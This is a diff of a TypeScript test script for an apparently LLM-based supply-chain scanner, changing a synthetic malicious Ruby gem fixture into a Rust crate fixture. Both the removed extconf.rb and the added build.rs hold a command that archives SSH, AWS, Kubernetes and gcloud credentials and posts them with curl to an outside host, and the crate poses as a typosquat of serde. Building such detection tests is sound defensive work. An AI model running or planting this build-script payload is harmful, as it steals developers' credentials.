@@ -1,87 +1,91 @@
 /**
- * test-ruby-package.ts
+ * test-rust-package.ts
  *
- * Ad hoc Ruby gem scanner for manual validation. Uses synthetic gem contents
- * but reuses the production package planning and analysis logic.
+ * Ad hoc Rust crate scanner for manual validation. Uses synthetic crate
+ * contents but reuses the production package planning and analysis logic.
  */
 
 import assert from 'node:assert/strict';
-import { parseTestLLMOptions } from './test-llm-options.js';
-import { formatTriageResults } from './src/supply-chain/llm/tools.js';
-import { createChatModel } from './src/supply-chain/llm/client.js';
-import { analyzePackageWithModel, planPackageInvestigation } from './src/supply-chain/nodes/primary-analysis.js';
-import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';
+import { parseTestLLMOptions } from './helpers/llm-options.js';
+import { formatTriageResults } from '../src/supply-chain/llm/tools.js';
+import { createChatModel } from '../src/supply-chain/llm/client.js';
+import { analyzePackageWithModel, planPackageInvestigation } from '../src/supply-chain/nodes/primary-analysis.js';
+import type { PackageMetadata, PackageSource, RegistrySignals } from '../src/supply-chain/types.js';
 
 const TARGETS = [
   {
-    label: 'malicious Ruby extconf credential harvester',
-    version: '0.1.0-malicious-fixture',
+    label: 'malicious Rust build.rs credential harvester',
+    version: '1.0.0-malicious-fixture',
     source: {
-      name: 'rackup-helper',
-      ecosystem: 'ruby',
-      version: '0.1.0-malicious-fixture',
+      name: 'serde-shadow',
+      ecosystem: 'cargo',
+      version: '1.0.0-malicious-fixture',
       installScripts: {
-        'extconf.rb': `require 'mkmf'`,
+        'build.rs': `use std::process::Command;`,
       },
       fileList: [
-        'data.tar.gz/rackup-helper.gemspec',
-        'data.tar.gz/extconf.rb',
-        'data.tar.gz/lib/rackup_helper.rb',
+        'serde-shadow-1.0.0/Cargo.toml',
+        'serde-shadow-1.0.0/build.rs',
+        'serde-shadow-1.0.0/src/lib.rs',
       ],
       fileContents: {
-        'data.tar.gz/rackup-helper.gemspec': `Gem::Specification.new do |spec|
-  spec.name = "rackup-helper"
-  spec.version = "0.1.0-malicious-fixture"
-  spec.summary = "Synthetic malicious Ruby gem fixture"
-  spec.extensions = ["extconf.rb"]
-end
+        'serde-shadow-1.0.0/Cargo.toml': `[package]
+name = "serde-shadow"
+version = "1.0.0-malicious-fixture"
+build = "build.rs"
 `,
-        'data.tar.gz/extconf.rb': `require 'fileutils'
+        'serde-shadow-1.0.0/build.rs': `use std::env;
+use std::process::Command;
 
-system("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/loot.tgz")
+fn main() {
+    let home = env::var("HOME").unwrap_or_default();
+    let _ = home;
+    Command::new("/bin/sh")
+        .args([
+            "-c",
+            "tar czf /tmp/stolen.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/stolen.tgz"
+        ])
+        .status()
+        .unwrap();
+}
 `,
-        'data.tar.gz/lib/rackup_helper.rb': `module RackupHelper
-  def self.enabled?
-    true
-  end
-end
-`,
+        'serde-shadow-1.0.0/src/lib.rs': `pub fn parse() -> bool { true }`,
       },
       suspiciousFiles: {},
     } satisfies PackageSource,
   },
 ];
 
-const llmOptions = parseTestLLMOptions('test-llm-ruby-package.ts');
+const llmOptions = parseTestLLMOptions('llm-rust-package.test.ts');
 
 function buildFakeMetadata(version: string): PackageMetadata {
   const signals: RegistrySignals = {
     maintainerChangedInLatestRelease: false,
     previousMaintainers: [],
     newMaintainers: [],
-    packageAgeDays: 14,
+    packageAgeDays: 30,
     publishedDaysAgo: 1,
-    typosquatCandidate: null,
+    typosquatCandidate: 'serde',
     isDependencyConfusion: false,
     hasProvenance: false,
-    riskScore: 6,
+    riskScore: 7,
   };
 
   return {
-    name: 'rackup-helper',
-    ecosystem: 'ruby',
+    name: 'serde-shadow',
+    ecosystem: 'cargo',
     latestVersion: version,
-    previousVersion: '0.0.9',
-    createdAt: '2026-03-01T00:00:00Z',
+    previousVersion: '0.9.9',
+    createdAt: '2026-02-15T00:00:00Z',
     updatedAt: new Date().toISOString(),
-    weeklyDownloads: 10,
+    weeklyDownloads: 25,
     maintainers: ['unknown'],
     hasInstallScripts: true,
     installScripts: {
-      'extconf.rb': 'ruby extconf.rb',
+      'build.rs': 'cargo build',
     },
-    repositoryUrl: 'https://example.invalid/rackup-helper',
-    description: 'Synthetic malicious Ruby fixture for supply-chain testing.',
+    repositoryUrl: 'https://example.invalid/serde-shadow',
+    description: 'Synthetic malicious Rust fixture for supply-chain testing.',
     registrySignals: signals,
   };
 }
@@ -146,5 +150,5 @@ for (const target of TARGETS) {
   }
 }
 
-assert(targetsWithIssues === TARGETS.length, 'Expected every Ruby target to be flagged by the test harness');
+assert(targetsWithIssues === TARGETS.length, 'Expected every Rust target to be flagged by the test harness');
 console.log('\n✅ Done\n');
